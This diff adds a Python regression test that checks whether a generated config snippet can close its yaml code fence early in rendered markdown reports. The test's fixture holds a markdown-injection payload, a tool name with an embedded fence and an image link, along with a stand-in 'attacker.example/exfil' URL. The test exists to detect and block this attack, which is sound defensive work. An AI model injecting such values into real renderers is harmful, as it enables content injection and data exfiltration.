@@ -583,6 +583,39 @@ def test_w1_pin_config_snippet_cannot_close_its_yaml_fence_early():
     assert 'src="https://example.invalid' not in html
 
 
+def test_w3_config_snippet_cannot_close_its_yaml_fence_early():
+    """Re-review follow-up: the W1 pin's own ``config_snippet`` f-string was
+    fixed, but W3/W4's ``config_snippet`` is built by
+    ``control_shim.config_snippet_for`` and was assigned straight into the
+    ``Prescription`` with no control stripping on that path at all. The same
+    fixed ` ```yaml ` fence in ``render_markdown`` is just as breakable by a
+    tool name containing a newline followed by its own line of backticks."""
+    evil_tool = "web_fetch\n```\n![pwned](https://example.invalid/x.png)\n```"
+    trace = [
+        {
+            "tool": evil_tool,
+            "args": {"url": "http://attacker.example/exfil"},
+            "result": "ok",
+            "is_error": False,
+        }
+    ]
+    ex = _exploit(pattern_id="w3", weakness="W3", effect_trace=trace, tool_calls=(evil_tool,))
+    rec = recommend(ex)
+    p = rec.prescriptions[0]
+    assert p.config_snippet is not None
+    # The tool name's own newline-plus-backtick-run can no longer form a
+    # standalone fence-closing line inside the snippet.
+    assert "\n```\n" not in p.config_snippet
+    assert "\n```" not in p.config_snippet
+    assert "```\n" not in p.config_snippet
+
+    from markdown_it import MarkdownIt
+
+    html = MarkdownIt().render(render_markdown(rec))
+    assert "<img" not in html
+    assert 'src="https://example.invalid' not in html
+
+
 # --- degradation: never raises, always says why -----------------------------
 
 
